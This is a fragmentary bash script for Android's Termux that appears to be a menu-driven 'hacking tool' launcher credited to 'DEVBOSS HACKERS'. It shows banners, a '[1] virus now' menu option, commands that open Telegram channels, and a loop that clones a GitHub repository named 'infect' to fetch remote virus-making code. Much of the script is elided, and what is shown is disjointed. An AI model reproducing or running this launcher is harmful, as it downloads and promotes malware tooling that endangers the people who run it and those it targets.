# A tool by nitro from https://t.me/lll_n_lll1
...
'
echo " " 
echo -e "$red                       ▶Coded by$grn lIlBIlI$red◀$rset"
echo -e "$red                      ⫸$ylo  DEVBOSS HACKERS$red ⫷$rset"
echo 
# Functions
...
echo " "
echo " "
echo -e "$red                        ➡$cyan [\e[92m1\e[96m] virus now"
...
echo -e "$red                        ➡$cyan [\e[92m6\e[96m] DEVBOSS"
...
then
am start -a android.intent.action.VIEW -d https://t.me/lll_n_lll1 > /dev/null 2>&1
banner
menu
elif [ $optnz = "6" ];
then
am start -a android.intent.action.VIEW -d https://t.me/boss_lol0 > /dev/null 2>&1
banner
menu
elif [ $optnz = "7" ];
then
...
echo -e "\e[93m        MY WEBSITE:\e[92m t.me/lll_n_lll1\e[0m" | pv -qL 10
...
while git clone https://github.com/DEVBOSS1/infect.git 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
...
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://t.me/lll_n_lll1 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
